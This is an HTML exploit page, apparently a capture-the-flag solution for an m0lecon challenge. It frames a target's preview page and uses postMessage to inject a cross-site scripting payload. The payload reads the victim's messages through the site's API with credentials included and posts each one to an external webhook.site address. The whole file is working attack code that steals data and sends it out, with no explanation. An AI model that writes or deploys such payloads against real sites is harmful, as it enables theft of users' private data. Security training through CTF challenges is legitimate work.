<!doctype html>
<html>
    <body>
        <iframe
            id="f"
            src="https://2208c656-d0b0-4927-b65e-587a7bbb21d6.offsec.m0lecon.it/preview"
        ></iframe>
        <script>
            const WEBHOOK =
                "https://webhook.site/1b8598c9-0eea-49cc-989f-aadf8862983d";

            const payload = `<img src=x onerror="
              async function run() {
                const WEBHOOK = '${WEBHOOK}';
                const msgs = await fetch('/api/messages', {credentials:'include'}).then(r=>r.json());
                
                for (const m of msgs) {
                  await new Promise(r => setTimeout(r, 1000));
                  const body = await fetch('/api/messages/'+m.id, {credentials:'include'}).then(r=>r.json());
                  
                  // One request per message
                  await fetch(WEBHOOK, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(body)
                  });
                  
                  await new Promise(r => setTimeout(r, 1000));
                }
              }
              run();
            ">`;

            document.getElementById("f").onload = () => {
                document
                    .getElementById("f")
                    .contentWindow.postMessage({ html: payload }, "*");
            };
        </script>
    </body>
</html>
